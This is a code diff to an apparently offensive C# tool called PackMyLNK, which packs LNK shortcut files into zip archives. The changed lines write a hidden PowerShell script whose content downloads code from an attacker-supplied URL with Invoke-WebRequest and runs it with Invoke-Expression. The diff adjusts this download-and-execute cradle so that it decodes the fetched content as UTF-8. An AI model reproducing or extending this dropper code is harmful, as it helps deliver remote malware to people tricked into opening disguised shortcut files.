@@ -1,4 +1,4 @@
-﻿using ICSharpCode.SharpZipLib.Core;
+using ICSharpCode.SharpZipLib.Core;
 using ICSharpCode.SharpZipLib.Zip;
 
 class Program
@@ -33,7 +33,8 @@ class Program
         Console.WriteLine("PackMyLNK - A simple .zip packer for LNK files");
         Console.WriteLine();
         Console.WriteLine();
-        string psContent = $"Invoke-Expression (Invoke-WebRequest -Uri '{url}' -UseBasicParsing).Content";
+        string psContent = $"Invoke-Expression -Command ([Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri '{url}' -UseBasicParsing).Content))";
+
         File.WriteAllText(ps1FilePath, psContent);
 
         SetFileHidden(ps1FilePath);
